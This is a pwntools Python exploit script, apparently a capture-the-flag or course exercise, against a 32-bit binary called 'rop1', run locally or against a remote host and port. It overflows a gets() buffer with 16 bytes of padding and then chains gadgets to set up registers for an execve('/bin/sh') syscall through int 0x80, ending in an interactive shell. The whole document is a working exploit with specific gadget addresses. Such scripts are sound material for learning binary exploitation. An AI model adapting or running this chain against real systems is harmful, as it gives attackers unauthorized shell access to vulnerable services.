#!/usr/bin/env python3
import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap

# ... (start function remains the same) ...
def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdb
        return pwn.gdb.debug([binPath], gdbscript=gdbscript, aslr=False)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath])

binPath="./rop1"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
break *Test+32
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="info"
# elf = ... (This line moves)

# === START OF CHANGES ===

# NEW: Load the ELF file FIRST
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

# NEW: Search the binary for the string "/bin/sh".
# next() gets the first result from the search generator.
binSH = next(elf.search(b'/bin/sh'))
pwn.info(f"Found '/bin/sh' string in binary at: {hex(binSH)}")

# Now, start the process
io = start()

# CHANGED: We no longer need to parse the address.
# We just need to read the line to get past the printf()
# and reach the vulnerable gets().
io.recvuntil(b"is a great command, isn't it?\n")

# === END OF CHANGES ===


# define payload
# The buffer is 12 bytes. We need to overwrite 4 more bytes
# for the saved EBP register before we get to the return address.
# Total offset = 12 (buff) + 4 (EBP) = 16 bytes.
overFlow = b'A'*16 
junk =     pwn.p32(0xdeadbeef) # Used to fill space for popped registers we don't care about

# define gadgets (addresses from gogoGadget)
# NEW, CORRECT ADDRESSES (Use this)
popEAX =   pwn.p32(0x080491aa) # pop %eax; ret
popEBX =   pwn.p32(0x080491ac) # pop %ebx; ...; pop %edi; ret
popECX =   pwn.p32(0x080491b4) # pop %ecx; ...; ret
zeroEDX1 = pwn.p32(0x080491bb) # mov $0x0, %edx; inc %edx; ret
zeroEDX2 = pwn.p32(0x080491c2) # dec %edx; ret
int80 =    pwn.p32(0x080491c4) # int $0x80; ...; ret

# The ROP chain
payload = pwn.flat(
        [
            overFlow, # 1. Fill buff[12] and saved EBP (4 bytes)
            
            # 2. Set EAX = 0xb (syscall number for execve)
            popEAX,
            0xb,
            
            # 3. Set ECX = 0 (for envp=NULL)
            popECX,
            0x0,
            
            # 4. Set EBX = address of "/bin/sh" (for pathname)
            popEBX,
            binSH,    # This variable is now set by elf.search()
            junk,     # This fills the "pop %edi" part of the gadget
            
            # 5. Set EDX = 0 (for argv=NULL)
            zeroEDX1, # Sets EDX to 1
            zeroEDX2, # Decrements EDX to 0
            
            # 6. Call the syscall
            int80
        ]
    )
pwn.info("Payload length: %d",len(payload))

# Send the payload to the vulnerable gets()
io.sendline(payload)
# Pass control to the user to interact with the new shell
io.interactive()